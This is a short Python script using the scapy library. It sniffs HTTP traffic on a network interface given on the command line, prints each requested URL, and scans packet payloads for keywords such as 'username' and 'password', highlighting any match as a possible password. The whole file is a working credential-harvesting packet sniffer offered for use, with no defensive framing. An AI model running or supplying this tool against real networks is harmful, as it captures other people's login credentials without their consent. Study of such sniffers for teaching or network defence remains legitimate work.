#! usr/bin/env/python
import scapy.all as scapy
from scapy.layers import http
from termcolor import colored
import optparse
def packet_sniffer(interface):
    scapy.sniff(iface = interface, store = False, prn = process_sniffed_packages)
    #Receives the Iface, and invokes the method process_sniffed_packages

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def looking_password(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["uname", "username", "login", "email", "password", "pass"]
        for i in keywords:
            if i in load:
                return load

def process_sniffed_packages(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("*"*25)
        print("HTTP Request: " + url)
        login_info = looking_password(packet)
        if login_info:
            print colored("Possible password found : " + login_info, 'white', 'on_red')

def arguments():
    parser = optparse.OptionParser()
    parser.add_option("-i", "--interface", dest="interface", help="Select the interface to sniff")
    (options, arguments) = parser.parse_args()
    if not options.interface:
        parser.error("[+] Please specify an interface")
    else:
        return options

options = arguments()


packet_sniffer(options.interface)
